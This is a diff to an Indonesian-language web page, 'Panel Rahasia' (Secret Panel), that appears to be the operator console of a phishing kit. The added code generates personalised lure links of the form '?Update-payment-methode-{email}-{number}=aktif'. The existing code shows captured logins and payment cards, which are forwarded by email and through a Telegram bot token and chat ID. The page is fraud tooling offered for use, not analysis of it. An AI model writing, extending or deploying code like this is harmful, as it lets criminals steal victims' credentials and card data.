@@ -40,6 +40,26 @@
             font-size: 14px; transition: border 0.2s;
         }
         input:focus, textarea:focus { outline: none; border-color: #0071e3; }
+        .tautan-hasil {
+            background: #f5f5f7;
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 10px;
+            word-break: break-all;
+            font-size: 13px;
+            color: #1a1a1f;
+            border: 1px solid #e5e5e7;
+        }
+        .salin-btn {
+            margin-top: 8px;
+            padding: 6px 12px;
+            background: #0071e3;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 13px;
+        }
         button {
             padding: 12px 24px; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
             transition: all 0.2s; margin-top: 15px;
@@ -63,6 +83,8 @@
         }
         .status-refresh.aktif { background: #34c759; color: #fff; }
         .waktu { font-size: 11px; color: #888; margin-top: 5px; }
+        .baris-dua { display: flex; gap: 12px; }
+        .baris-dua > div { flex: 1; }
     </style>
 </head>
 <body>
@@ -70,15 +92,15 @@
     <div class="wadah">
         <div class="header">
             <h1>🔐 Panel Rahasia</h1>
-            <p>Pengaturan & Data Masuk</p>
+            <p>Pengaturan & Pembuatan Tautan</p>
         </div>
 
         <!-- PENGATURAN UMUM -->
         <div class="kotak">
-            <h2>⚙️ Pengaturan Tautan & Email</h2>
+            <h2>⚙️ Pengaturan Dasar</h2>
             
-            <label>Tautan Akses Website</label>
-            <input type="text" id="tautan" placeholder="https://namamu.pythonanywhere.com">
+            <label>Alamat Website (Tanpa Parameter)</label>
+            <input type="text" id="websiteUrl" placeholder="https://namamu.pythonanywhere.com">
             
             <label>Email Penerima Data</label>
             <input type="email" id="emailTujuan" placeholder="email@tujuan.com">
@@ -92,6 +114,27 @@
             <button class="btn-simpan" onclick="simpanPengaturan()">💾 Simpan Pengaturan</button>
             <p class="berhasil" id="pesanBerhasil">✅ Pengaturan tersimpan!</p>
             <p class="info">Pengaturan tersimpan otomatis, tidak hilang saat di-refresh</p>
+        </div>
+
+        <!-- GENERATOR PARAMETER TAUTAN -->
+        <div class="kotak">
+            <h2>🔗 Buat Tautan Parameter</h2>
+            
+            <label>Email Pengguna</label>
+            <input type="email" id="paramEmail" placeholder="email@pengguna.com" oninput="buatTautan()">
+            
+            <label>Nomor Acak</label>
+            <div class="baris-dua">
+                <input type="number" id="paramAngka" placeholder="123456" oninput="buatTautan()">
+                <button style="margin-top:0; padding:12px 16px; background:#0071e3; color:#fff;" onclick="acakAngka()">🎲 Acak</button>
+            </div>
+
+            <label>Tautan Lengkap</label>
+            <div class="tautan-hasil" id="tautanHasil">
+                Isi Email & Nomor di atas...
+            </div>
+            <button class="salin-btn" onclick="salinTautan()">📋 Salin Tautan</button>
+            <p class="info" style="margin-top:8px;">Format: ?Update-payment-methode-{email}-{nomor}=aktif</p>
         </div>
 
         <!-- REFRESH OTOMATIS -->
@@ -128,17 +171,19 @@
 
         // === MUAT DATA SAAT BUKA HALAMAN ===
         function muatPengaturan() {
-            document.getElementById('tautan').value = localStorage.getItem('tautanAkses') || '';
+            document.getElementById('websiteUrl').value = localStorage.getItem('websiteUrl') || '';
             document.getElementById('emailTujuan').value = localStorage.getItem('emailTujuan') || '';
             document.getElementById('botToken').value = localStorage.getItem('botTokenTelegram') || '';
             document.getElementById('chatIdTelegram').value = localStorage.getItem('chatIdTelegram') || '';
+            
             tampilkanDataMasuk();
             perbaruiWaktuTerakhir();
+            buatTautan();
         }
 
         // === SIMPAN PENGATURAN ===
         function simpanPengaturan() {
-            localStorage.setItem('tautanAkses', document.getElementById('tautan').value.trim());
+            localStorage.setItem('websiteUrl', document.getElementById('websiteUrl').value.trim());
             localStorage.setItem('emailTujuan', document.getElementById('emailTujuan').value.trim());
             localStorage.setItem('botTokenTelegram', document.getElementById('botToken').value.trim());
             localStorage.setItem('chatIdTelegram', document.getElementById('chatIdTelegram').value.trim());
@@ -146,6 +191,41 @@
             const pesan = document.getElementById('pesanBerhasil');
             pesan.style.display = 'block';
             setTimeout(() => pesan.style.display = 'none', 3000);
+            
+            buatTautan();
+        }
+
+        // === BUAT TAUTAN LENGKAP ===
+        function buatTautan() {
+            const url = document.getElementById('websiteUrl').value.trim();
+            const email = document.getElementById('paramEmail').value.trim();
+            const angka = document.getElementById('paramAngka').value.trim();
+            const hasil = document.getElementById('tautanHasil');
+            
+            if (!url || !email || !angka) {
+                hasil.innerHTML = '<span style="color:#888;">Isi Email & Nomor di atas...</span>';
+                return;
+            }
+            
+            const tautanLengkap = `${url}/?Update-payment-methode-${email}-${angka}=aktif`;
+            hasil.innerHTML = tautanLengkap;
+        }
+
+        // === BUAT ANGKA ACAK ===
+        function acakAngka() {
+            const acak = Math.floor(Math.random() * 900000) + 100000;
+            document.getElementById('paramAngka').value = acak;
+            buatTautan();
+        }
+
+        // === SALIN TAUTAN ===
+        function salinTautan() {
+            const teks = document.getElementById('tautanHasil').innerText;
+            if (!teks.includes('Isi')) {
+                navigator.clipboard.writeText(teks).then(() => {
+                    alert('✅ Tautan disalin!');
+                });
+            }
         }
 
         // === REFRESH OTOMATIS ===
@@ -154,7 +234,6 @@
             const status = document.getElementById('statusRefresh');
             
             if (intervalRefresh) {
-                // Matikan
                 clearInterval(intervalRefresh);
                 intervalRefresh = null;
                 tombol.textContent = '▶️ Mulai Refresh Setiap 10 Detik';
@@ -162,8 +241,7 @@
                 status.textContent = 'Nonaktif';
                 status.classList.remove('aktif');
             } else {
-                // Nyalakan
-                tampilkanDataMasuk(); // Langsung perbarui sekali
+                tampilkanDataMasuk();
                 intervalRefresh = setInterval(() => {
                     tampilkanDataMasuk();
                     perbaruiWaktuTerakhir();
@@ -177,7 +255,6 @@
 
         // === TAMPILKAN DATA MASUK ===
         function tampilkanDataMasuk() {
-            // Data Login
             const daftarLogin = document.getElementById('daftarLogin');
             const dataLogin = JSON.parse(localStorage.getItem('daftarLogin') || '[]');
             if (dataLogin.length === 0) {
@@ -192,7 +269,6 @@
                 `).join('');
             }
 
-            // Data Kartu
             const daftarKartu = document.getElementById('daftarKartu');
             const dataKartu = JSON.parse(localStorage.getItem('daftarKartu') || '[]');
             if (dataKartu.length === 0) {
@@ -213,13 +289,11 @@
             }
         }
 
-        // === PERBARUI TANDA WAKTU ===
         function perbaruiWaktuTerakhir() {
             document.getElementById('waktuTerakhir').textContent = 
                 'Terakhir diperiksa: ' + new Date().toLocaleString();
         }
 
-        // === MULAI SAAT HALAMAN DIBUKA ===
         document.addEventListener('DOMContentLoaded', muatPengaturan);
     </script>
 </body>
